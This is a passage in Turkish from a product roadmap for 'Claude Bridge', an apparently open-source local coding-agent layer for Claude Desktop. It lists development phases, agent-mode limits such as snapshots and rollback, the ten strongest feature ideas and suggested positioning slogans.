7. Snapshot / rollback mekanizmasını güçlendir.

Bu aşama Bridge'i güvenli agent katmanı haline getirir.

---

### Aşama 3 — Akıllı Context

Amaç: Claude'un doğru dosyaları daha hızlı bulmasını sağlamak.

Yapılacaklar:

1. `detect_project_type`
2. Framework-aware supplemental targets
3. `build_context_pack`
4. `suggest_validation_commands`
5. Index persistence
6. TypeScript/JavaScript desteği
7. Test dosyası eşleştirme heuristics

Bu aşama Claude'un tahmin oranını azaltır.

---

### Aşama 4 — Kontrollü Agent Mode

Amaç: Küçük görevleri güvenli şekilde uçtan uca yaptırmak.

Yapılacaklar:

1. `run_agent_loop_session` API'sini düzelt.
2. JSON string yerine structured steps kullan.
3. Max iteration, max files, max lines limitleri ekle.
4. Her adımda snapshot al.
5. Validation planını otomatik uygula.
6. Stop reason üret.
7. Başarısızlıkta rollback öner.
8. Session summary üret.

Bu aşama Claude Code benzeri otonom deneyime en çok yaklaşan bölüm olur.

---

### Aşama 5 — Claude Code'dan Farklılaşma

Amaç: Sadece alternatif değil, farklı ve güçlü bir ürün olmak.

Yapılacaklar:

1. Local Web Approval UI
2. Workspace Profiles
3. Project Doctor
4. Policy templates
5. Team-safe config
6. Publish readiness scan
7. Security-first reports
8. Project health score

Bu aşama Bridge'i "Claude Code taklidi" olmaktan çıkarır.

---

## 41. En Güçlü 10 Ürün Fikri

Öncelik sırasına göre en güçlü fikirler:

1. `write_file` + `search_in_files`
2. `path_outside_project` otomatik recovery akışı
3. Patch preview / dry-run
4. Undo / rollback
5. Policy file
6. Patch risk score
7. Context pack builder
8. Framework detection
9. Project Doctor
10. Controlled Agent Mode

Bu 10 özellik gelirse proje çok daha güçlü konumlanır.

---

## 42. Önerilen Konumlandırma

Claude Bridge kendisini şöyle konumlandırmalı:

> Claude Desktop için güvenli, local-first, policy-controlled coding agent layer.

Alternatif kısa mesajlar:

- "Claude Desktop'u güvenli yerel geliştirme asistanına dönüştürür."
- "Claude Code hissi, daha fazla kontrol ve daha fazla şeffaflıkla."
- "Local-first, open-source, policy-controlled coding bridge."
- "Claude Desktop için çoklu proje destekli güvenli MCP bridge."

Bu konumlandırma doğrudan Claude Code ile savaşmaz; farklı bir değer önerisi sunar:

- Daha şeffaf
- Daha kontrol edilebilir
- Daha güvenli
- Açık kaynak
- Policy tabanlı
- Çoklu workspace destekli
- Local-first

---

*Bu dosya projenin tamamı iki kez okunduktan sonra oluşturulmuştur. Değişiklik yapılmadan önce her madde ayrı ayrı değerlendirilmelidir.*
